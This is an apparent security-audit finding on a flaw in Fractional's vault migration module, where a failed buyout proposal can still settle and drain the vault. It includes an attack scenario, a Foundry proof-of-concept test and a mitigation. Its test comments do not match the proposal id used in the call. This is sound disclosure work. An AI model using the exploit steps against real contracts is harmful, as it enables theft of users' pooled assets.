[H-17] Proposal which started buyout which fails is able to settle migration as if its buyout succeeded.
Submitted by panprog, also found by 0xsanson, bin2chen, hansfriese, kenzo, PwnedNoMore, smiling_heretic, Treasure-Seeker, and TrungOre
If one proposal starts a buyout which fails, and then another proposal starts a buyout which succeeds, then both of them will be commited andsettleVaultcan be called on any of them. If it’s called on the failed proposal first, then it will settle even though buyout has failed (and it can proceed to withdraw all tokens to a new vault).
Malicious proposal being able to successfully migrate scenario:
Bob starts a malicious proposal to migrate with a lowtargetPrice, which immediately initiates a buyoutBuyout fails (but malicious proposal is marked ascommitted)Alice starts a good proposal to migrate, which goes on to buyout which eventually succeeds to get50%+ fractionsAlice ends the buyoutBob immediately callssettleVaultwith his malicious proposalBob’s malicious proposal settles (and he can go on to withdraw all tokens from the vault into his malicious proposal effectively stealing assets from Alice).
Proof of Concept
Add this code to test/Migration.t.sol
function testPanprogBugH3() public {initializeMigration(alice, bob, 10000, 4000, true);(nftReceiverSelectors, nftReceiverPlugins) = initializeNFTReceiver();// Migrate to a vault with no permissions (just to test out migration)address[] memory newModules = new address[](2);newModules[0] = migration;newModules[1] = modules[1];// Bob makes the proposalbob.migrationModule.propose(vault,newModules,nftReceiverPlugins,nftReceiverSelectors,TOTAL_SUPPLY * 2,1 ether);// Bob joins the proposal with 4000 fractionsbob.migrationModule.join{value: 1 ether}(vault, 1, 4000);// since the target price is reached, bob starts the buyoutbob.migrationModule.commit(vault, 1);vm.warp(rejectionPeriod + 1);// after buyout fails, bob ends it// note: bob's proposal is still commited even though it has failedbob.buyoutModule.end(vault, burnProof);bob.migrationModule.withdrawContribution(vault, 1);// Alice makes a different proposal (we use bob's data for simplicity)alice.migrationModule.propose(vault,newModules,nftReceiverPlugins,nftReceiverSelectors,TOTAL_SUPPLY * 10,1 ether);// Alice joins the proposal with 6000 fractionsalice.migrationModule.join{value: 1 ether}(vault, 2, 6000);// since the target price is reached, alice starts the buyoutalice.migrationModule.commit(vault, 2);vm.warp(proposalPeriod * 10);// after buyout succeeds (as it has >50% of fractions), alice ends it// note: both bob's and alice's proposals are commited at this pointalice.buyoutModule.end(vault, burnProof);// Now bob (whose buyout has failed) settles his proposal// It should revert, but it succeedsvm.expectRevert(abi.encodeWithSelector(IMigration.UnsuccessfulMigration.selector));bob.migrationModule.settleVault(vault, 2);}
Recommended Mitigation Steps
Add a new storage variable for currently active proposal id. Allow callingsettleVaultonly for active proposal id (and also only if buyout’s proposer equalsMigrationaddress, otherwise there can be a different successful buyout not connected to the active proposal). Also add appropriate checks with active proposal in the other functions as well (don’t allow to commit if there is an active proposal etc).
Ferret-san (Fractional) confirmed
HardlyDifficult (judge) commented:
A failed migration can settle after a successful buyout. Agree this is High risk.Selecting this submission as the primary for including a clear coded POC.